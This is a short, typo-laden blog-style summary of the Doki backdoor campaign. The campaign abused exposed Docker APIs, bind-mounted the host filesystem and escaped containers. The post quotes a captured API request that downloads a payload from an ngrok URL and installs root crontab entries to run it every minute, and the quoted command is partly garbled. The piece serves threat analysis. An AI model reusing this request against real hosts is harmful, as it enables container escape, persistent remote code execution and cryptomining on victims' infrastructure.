---

title: " Doki Malware Attack  "
description: "  "

---


# Doki Malware Attack 

Recently in July 2020 , Intezer Security Researchers have detected a new malware payload that is diffenet from standard crypto-miners whcih is a fully undetected backdoor named as doki. it used an 
undocumented method to contact its operator by abusing the dogecoin cryptocurrency blockchain in a unique way in order to dynamically generate its C2 domain address . th malware managed to stay under the radar for over 6 months despite samples being publicaly availabe in VirusTotal 


In this attack , The Threat is targeting misconfigured containerized environments in the cloud. the attackers scan for publicly accessible Docker API ports and exploit them in order to setup their own 
containers and execute malware on the victim's infrastructure . the attackers are spaning and deleting a number of container duringa attack 


- Attack Initialtion :- The attack is based on non-malicious `alpine-curl ` image publicly available on Docker Hub . This image is being abused further to carry out malicious activity 

![](/img/Intizer_Ari_Info_v3.pngw3.webp)


The technique is based on the creation of a new container , accomplished by posting a `create ` API request the body of the request contains configuration parameter for the container 

one of the parameter is   `bind` which lets user configure which file or directort on the host machine into a contaienr. 


Ngrok is a service which provides secure tunnels to connect between local servers and the public internet. The attacker abuses Ngrok to craft unique URLs with a short lifetime and uses them to download payloads during the attack by passing them to the curl based image. The downloaded payload is saved in /tmpXXXXXX directory in the container.


```

Calling POST /v1.16/containers/create (\"Cmd\": [ \"-c\", \"curl --retry 3 -m 60 -o /tmpe904c3/tmp/tmpfileb64ea3ba45a6a0abd0fe9d22511b77c6d \\\"http://04a4baaee996.narok.io/f/serve?1=d\\u0026r=b64ea3ba48a6a0abdOfe9d22511b77c6\\\"; echo \\\n* * * * root sh /tmp/tmpfileb64ea3ba48a6a0abdOfe9d22511b77c6d\\\" \\u003e/tmpe904c3/etc/crontab; echo \\\nA A A A root sh /tmp/tmpfileb64ea3ba48a6a0abd0fe9d22511b77c6d\\\" \\u003e/tmpe904c3/etc/cron.d/lm; chroot /tmpe904c3 sh -c \\\"cron 11 crond\\\"\" 
,\"Entrypoint\":\n/bin/sh\",\"HostConfig\":{\"Binds\":[\"/:/tmpe904c3\"]1, \"Image\":\"sha256:5301ebcf503e9c6d3a3SceOde6dObc3d796560c2e05ble09SeSa6ab2afc2bdf0\" 


```

By using the bind configuration the attacker can control the cron utility of the host.
The attacker modifies the hostâ€™s cron to execute the downloaded payload every minute. We observed two types of payloads, one is a network scanner script and the other is a downloader script.

The network scanner uses zmap, zgrap, and jq to scan ports associated with Redis, Docker, SSH, and HTTP.

Using a list of hardcoded ranges of IP addresses, which belong mostly to cloud servers such as AWS and local cloud providers in foreign regions (we have seen providers from China, Austria, and the United Kingdom), the script gathers the information and uploads it to another Ngrok URL.

The downloader script is responsible for downloading and installing various malware binaries, often one of several well known cryptominers. We have noticed it can also install a fully undetected malware component. We named this malware Doki and will provide a technical analysis in the next section.

The attacker has full control over the configuration of the container he creates and the files that are dropped into the container. By using legitimate API commands, the attacker is able to escape from the container he created and execute any code from within the server itself.